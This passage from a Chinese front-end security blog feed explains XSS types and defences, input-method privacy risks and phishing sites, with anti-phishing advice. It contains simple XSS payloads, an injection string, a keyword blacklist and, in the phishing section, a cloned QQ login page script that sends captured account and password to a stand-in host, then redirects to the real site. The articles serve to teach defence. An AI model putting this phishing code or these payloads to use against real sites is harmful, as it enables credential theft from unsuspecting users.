/>注入型脚本永久存储在目标服务器（数据库）上。当浏览器请求数据时，脚本从服务器上传回并执行。</li><li><strong>反射型 XSS</strong><br />当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</li><li><strong>基于 DOM 的 XSS</strong><br />通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</li></ul><p>造成 XSS 最主要的原因是，过于信任用户输入，简单来说，安全问题就是信任问题。客户端提交的数据本就是应用所需，无法避免，但是攻击者通过输入数据这一过程插入恶意代码对网站进行攻击，所以我们绝不能信任用户的数据输入。</p><p><a name="167c94c7"></a></p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>这种类型的攻击危害是最直接的，一旦恶意代码被植入服务器，用户受到攻击的可能性将会比较大，因为用户是信任此服务器的，服务器返回的数据会直接执行。处理这种攻击手段，首先要遵循不信任原则–不要信任任何用户输入的数据，做足用户安全输入验证。例如留言板：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">value</span>=<span class="string">&quot;这里是用户填写的数据&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，用户填入留言信息，存储到数据库中，其它用户访问时取得此段信息并显示。</p><p>但这个输入并没有任何安全验证手段，因此可以通过填入以下形式的文本注入恶意代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;恶意代码&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于没有任何验证，这段文本将会被发送到数据库存储起来，当其它用户查看留言时，将会直接当成 JS 代码执行。所以在处理用户输入时，应严格控制输入格式，某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则，建立黑名单内容，对诸如”&lt;”、”&gt;”、”script”、””等等具有危害性的关键字建立正则拦截集合，供给输入验证拦截使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> blacklist = [<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;&lt;a&gt;&quot;</span>];</span><br></pre></td></tr></table></figure><p><a name="7ba1673b"></a></p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器，也就是说攻击者需要成功诱导用户点击一个恶意链接才能攻击成功。例如下面这个例子，用户正常的发送消息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?id=10010&amp;send=Hello</span><br></pre></td></tr></table></figure><p>接受者正常显示消息”Hello”，但是当攻击者输入以下地址时:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/message.php?id=10010&amp;send=</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;恶意代码&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接收者就可能会执行该段恶意代码，攻击者达到目的。</p><p>防御手段依然是不要信任用户输入，对用户输入的 URL 信息进行安全验证。</p><p><a name="aa767cdf"></a></p><h3 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a>基于 DOM 的 XSS</h3><p>通过修改页面的 DOM 节点形成的 XSS，称之为 DOM Based XSS，从效果上来说也是反射型 XSS。当用户能够通过交互修改浏览器页面中的 DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞。例如下面这个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;s&quot;</span> <span class="attr">value</span>=<span class="string">&quot;write&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;test()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;t&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + str + <span class="string">&#x27;&quot;&gt;testlink&lt;/a&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面这段代码允许用户手动输入一个连接并生成 a 标签在页面中，也就是允许用户修改 dom 内容，那么只要像这样写入 input 元素的值，就成功执行了攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&#x27;注入攻击&#x27;)</span><br></pre></td></tr></table></figure><p>首先写入一个<code>&quot;</code>结束掉<code>href=&quot;</code>，然后绑定一个 onclick 事件，当用户点击生成的 a 标签连接时，就出发了 alert 函数，如果时恶意代码，那就是成功执行了攻击。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913102168-ce3a3569-6a9b-48f6-88c1-dfdc5989a158.png#height=409&id=K8i9Z&originHeight=409&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19566&status=done&style=none&title=&width=955" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913102168-ce3a3569-6a9b-48f6-88c1-dfdc5989a158.png#height=409&id=K8i9Z&originHeight=409&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19566&status=done&style=none&title=&width=955" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="图1.png"></p><p><a name="40c519b5"></a></p><h4 id="图-1-基于-DOM-的-XSS"><a href="#图-1-基于-DOM-的-XSS" class="headerlink" title="图 1.基于 DOM 的 XSS"></a>图 1.基于 DOM 的 XSS</h4><p><a name="687bef9f"></a></p><h3 id="XSS-的一些防范"><a href="#XSS-的一些防范" class="headerlink" title="XSS 的一些防范"></a>XSS 的一些防范</h3><p>XSS 的防御是复杂的。流行的浏览器都内置了一些对抗 XSS 的措施，比如 Firefox 的 CSP、Noscript 扩展，IE 8 内置的 XSS Filter 等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被 XSS 攻击。</p><ul><li><strong>切勿使用</strong><code>**&lt;base&gt;**</code><strong>标签</strong>。<code>&lt;base&gt;</code>标签为页面上的所有链接规定默认地址或默认目标。也就是说，只要能够攻击者能够在页面中插入<code>&lt;base&gt;</code>标签，就可以通过 img、script 等拥有 src 属性的元素加载非法图片、脚本等进行网站攻击。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><br />比如上面这个标签，此时加载的应该本地根路径下的<code>a.js</code>文件执行。但是攻击者成功插入了<code>&lt;base&gt;</code>标签：<br />那么此时加载的脚本将会变成来自<a href="http://www.xss.com根目录下的同名脚本,攻击者成功执行了攻击.所以在设计安全对策时,一定要过滤掉这个危险的标签./">http://www.xss.com根目录下的同名脚本，攻击者成功执行了攻击。所以在设计安全对策时，一定要过滤掉这个危险的标签。</a></p><ul><li><strong>HttpOnly</strong>。防止攻击者窃取 Cookie 最简单最有效的办法就是，开启 Cookie 的 HttpOnly 属性，一旦开启此属性，JS 将无法读取 Cookie 信息，所以任何 XSS 攻击都无法获取 Cookie，从根源上阻止了 Cookie 劫持。所以，在设计系统时，首先应该避免 Cookie 在系统中的引用，Cookie 应该是孤立的、仅存在 Http 协议的。</li><li><strong>输入检查</strong>。输入检查是最常见的手段，也是非常有效的手段。用户输入的字符应该切实跟业务相关，譬如最简单的注册用户名，只允许用户输入汉字、字母、数字和一些下划线等不具备危险性的字符，这样就能大程度地阻止由于用户输入这个交互导致的攻击漏洞。为什么说要切实跟业务相关？譬如下面这个例子：<br />用户需要一个计算的简单输入：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+2&lt;4</span><br></pre></td></tr></table></figure><p><br />如果简单粗暴地直接把<code>&lt;</code>过滤掉或者替换掉，就会对用户的意思造成曲解。<br />如果是富文本，则要根据白名单原则，仅仅允许用户输入允许使用的标签，例如<code>&lt;a&gt;</code>、<code>&lt;div&gt;</code>、<code>&lt;h&gt;</code>、<code>&lt;img&gt;</code>等比较安全的标签，再者在富文本中严格禁止事件的使用，因为富文本是不需要展示动态效果的。</p><ul><li><strong>输出检查。</strong>输出检查也能有效防止 XSS 攻击，一般来说，除了富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如使用<code>HtmlEncode</code>对即将输出到页面 HTML 进行编码，部分编码规则如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp; --&gt; &amp;amp;</span><br><span class="line">&lt; --&gt; &amp;lt;</span><br><span class="line">&gt; --&gt; &amp;gt;</span><br><span class="line">&quot; --&gt; &amp;quot;</span><br><span class="line">&#x27; --&gt; &amp;#x27;</span><br><span class="line">/ --&gt; &amp;#x2F;</span><br></pre></td></tr></table></figure><p><br />HtmlEncode 不是专有名词，而是一种函数实现。在 PHP 中，实现 HtmlEncode 的函数有 htmlentities() 和 htmlspecialchars() 两个函数。<br />相应地，JavaScript 的编码方式使用 JavascriptEncode，与 HtmlEncode 不同的是，JavascriptEncode 使用<code>\</code>进行转义，转义掉一些危险字符诸如 <code>&#39;</code>、<code>&quot;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>\</code>、<code>&amp;</code>、<code>#</code> 等。<br />一般来说，在 MVC 或者 MVVM 框架中，XSS 攻击主要发生在 V 层，所以大部分的 XSS 攻击都能够在模板系统中解决。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>输入法</title>
      <link href="/2023/06/29/frontend/security/shu-ru-fa/"/>
      <url>/2023/06/29/frontend/security/shu-ru-fa/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="BupZr"></a></p><h1 id="场景-1"><a href="#场景-1" class="headerlink" title="场景 1"></a>场景 1</h1><p>输入法一定是安全的吗？在之前也曾曝出不少输入法搜集用户信息获取照片权限，通讯录权限，等。</p><p>试想一下当你使用某种聊天工具，在跟朋友探讨一件商品，过了一会儿，在某度，某宝，某东可能就推荐了。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178238464-8ae32ff8-5f44-409a-ad54-c6e4b0baf136.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178238464-8ae32ff8-5f44-409a-ad54-c6e4b0baf136.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>发现呢是已经推送了，神奇的输入法<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178249845-7bb53a3e-2de2-4117-82b4-eed34b98b589.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178249845-7bb53a3e-2de2-4117-82b4-eed34b98b589.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="jLpKr"></a></p><h1 id="场景-2"><a href="#场景-2" class="headerlink" title="场景 2"></a>场景 2</h1><p>在我们使用微信，支付宝，等支付软件付款的时候，发现键盘是 App 自带的，并非第三方输入法<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178263329-f8d7b55d-4b6e-4683-8468-bc52c493b144.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178263329-f8d7b55d-4b6e-4683-8468-bc52c493b144.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这个是由于第三方软件输入的频次过多他会把密码记录下来，其二就是如果三方输入法被木马入侵，也容易盗取我们的密码造成损失。</p><p>所以在我们开发移动端的时候遇到支付都会使用虚拟键盘<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178277206-afe0a51a-7c4d-425e-bbe3-afbd2dc29a1c.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/300943/1664178277206-afe0a51a-7c4d-425e-bbe3-afbd2dc29a1c.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼网站</title>
      <link href="/2023/06/29/frontend/security/diao-yu-wang-zhan/"/>
      <url>/2023/06/29/frontend/security/diao-yu-wang-zhan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="365ef2a9"></a></p><h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>钓鱼网站是指欺骗用户的虚假网站。钓鱼网站的基本特征是，其界面基本与真实网站一致，充满诱导性，通过表单交互来欺骗消费者或者窃取访问者提交的账号和密码信息。钓鱼网站是互联网中最常碰到的一种诈骗方式，通常伪装成银行及电子商务、窃取用户提交的银行账号、密码等私密信息的网站。</p><p><a name="a724a10a"></a></p><h3 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h3><p>在 QQ 非常流行的时期，最常见的钓鱼网站恐怕非”QQ 空间”莫属。高仿一个网站并不是什么难事，尤其是对于拥有 H5 开发经验的人来说。下面这个例子就是笔者花了不到一个小时便仿造出来的 QQ 空间登录页：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913253804-8ccd6804-bb37-4bdb-b749-a7fc9562ef7e.png#height=1080&id=Nim0a&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622556&status=done&style=none&title=&width=1920" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913253804-8ccd6804-bb37-4bdb-b749-a7fc9562ef7e.png#height=1080&id=Nim0a&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622556&status=done&style=none&title=&width=1920" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="仿造.png"></p><p>真正的 QQ 空间登录页:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913261046-69a9b352-387c-483e-ba15-442b334709a5.png#height=1080&id=pmPEq&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622401&status=done&style=none&title=&width=1920" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913261046-69a9b352-387c-483e-ba15-442b334709a5.png#height=1080&id=pmPEq&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622401&status=done&style=none&title=&width=1920" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="真正.png"></p><p>可以看到，两者之间几乎没有任何差别。在笔者的仿造网站中，用户输入 QQ 账号与 QQ 密码之后点击登录，触发表单提交，提交到远程服务器去，这样就成功的骗到了一个 QQ 账号。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;loginform&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">&quot;loginform&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;www.test.com&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">target</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;支持QQ号/邮箱/手机号登录&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;支持QQ号/邮箱/手机号登录&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了防止露馅，表单需禁止自动提交，防止发生跳转而露出马脚，所以提交操作利用 submit 按钮的 click 事件回调完成，并且提交完成后重定向页面至真实的<code>QQ空间</code>地址，虽然登录不成功，但用户很可能不会去注意这个问题，然后继续在真实的登录页面下登录。如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 禁止表单自动提交</span></span><br><span class="line">  <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;loginform&quot;</span>);</span><br><span class="line">  form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> submitBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submitBtn&quot;</span>);</span><br><span class="line">  submitBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> account = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inputAccount&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">var</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inputPassword&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;账号:&quot;</span> + account, <span class="string">&quot;密码:&quot;</span> + password);</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&quot;http://www.test.com/?name=&quot;</span> + account + <span class="string">&quot;&amp;password=&quot;</span> + password);</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;https://qzone.qq.com/&quot;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结果：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913275517-279c1ae7-54b5-478d-8bcd-89352677e134.png#height=286&id=aHCw4&originHeight=286&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19949&status=done&style=none&title=&width=706" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913275517-279c1ae7-54b5-478d-8bcd-89352677e134.png#height=286&id=aHCw4&originHeight=286&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19949&status=done&style=none&title=&width=706" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="结果.png"></p><p>假如<code>http://www.test.com/</code>真实存在，那么该次盗取攻击已经成功执行了。</p><p><a name="f7105156"></a></p><h3 id="攻击发生及成功的原因"><a href="#攻击发生及成功的原因" class="headerlink" title="攻击发生及成功的原因"></a>攻击发生及成功的原因</h3><p>攻击者多数是抱着从中获利的心态，利用人类的贪婪、恐惧、信任、善良等情感诱骗被攻击者。例如，人们在收到巨额中将信息时，内心的贪欲可能战胜了理智，从而跟随攻击者的指引，一步一步陷入深渊，最终在攻击者仿造的某银行登录页面上泄露银行账户以及密码，造成损失。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/jpeg/1787397/1594913283391-c5b9804c-babf-4b67-9788-799b46327315.jpeg#height=123&id=ltGTD&originHeight=123&originWidth=400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17470&status=done&style=none&title=&width=400" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/jpeg/1787397/1594913283391-c5b9804c-babf-4b67-9788-799b46327315.jpeg#height=123&id=ltGTD&originHeight=123&originWidth=400&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17470&status=done&style=none&title=&width=400" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="短信.jpeg"></p><p><a name="48fb2cd0"></a></p><h4 id="防范办法"><a href="#防范办法" class="headerlink" title="防范办法"></a>防范办法</h4><ul><li><strong>查验“可信网站”</strong>   正规经营的网站一般情况下在中国互联网信息中心（CNNIC）存有备案信息，备案信息对应着一个编号，通常情况下该编号存在于网站首页的底部，对应着一个连接，点击会跳转至该网站的经营许可证，格式如“<a href="http://www.qq.com/culture.shtml">粤网文[2017]6138-1456 号</a>”</li><li><strong>核对网站域名</strong>   无论网站首页如何相似，域名是不可能相同的。通过这点我们就可以辨别当前访问的网站是否是正规网站。</li><li><strong>查询网站备案</strong>   通过 ICP 备案可以查询网站的基本情况、网站拥有者的情况，对于没有合法备案的非经营性网站或没有取得 ICP 许可证的经营性网站，根据网站性质，将予以罚款，严重的关闭网站 。</li><li><strong>查看安全证书</strong>   大型的电子商务网站都应用了可信证书类产品，这类的网站网址都是“https”开头的，如果发现不是“https”开头，应谨慎对待。</li></ul><p><a name="6de48d87"></a></p><h3 id="反钓鱼联盟"><a href="#反钓鱼联盟" class="headerlink" title="反钓鱼联盟"></a>反钓鱼联盟</h3><p>中国反钓鱼网站联盟成员单位包括：工商银行、农业银行、中国银行、建设银行、华夏银行、光大银行、银河证券、腾讯、淘宝、支付宝等几十家金融机构和电子商务网站，以及中国万网、中企动力、厦门中资源、厦门华商盛世、阿里巴巴、ChinaSpringboardInc.等国内主要的域名注册服务机构。“中国反钓鱼网站联盟”并非官方机构，它的成员包括了域名管理机构、注册服务机构，以及银行证券类、电子商务类、网络安全类等企业，目的就是为了发现和治理“钓鱼网站”，主要是针对假冒其成员单位的“钓鱼网站”。该联盟在接到涉及联盟成员的投诉后，权威技术鉴定机构会立即对其进行判定，一经认定，两个小时内暂停其域名解析，终止欺诈行为。从处理的及时性上大大降低了“钓鱼网站”所造成的危害  。</p><p><a name="9415a826"></a></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最跟本的预防办法还是擦亮眼睛，不要轻信来历不明的信息，谨防电信诈骗。</p><script type="text&#x2F;javascript" 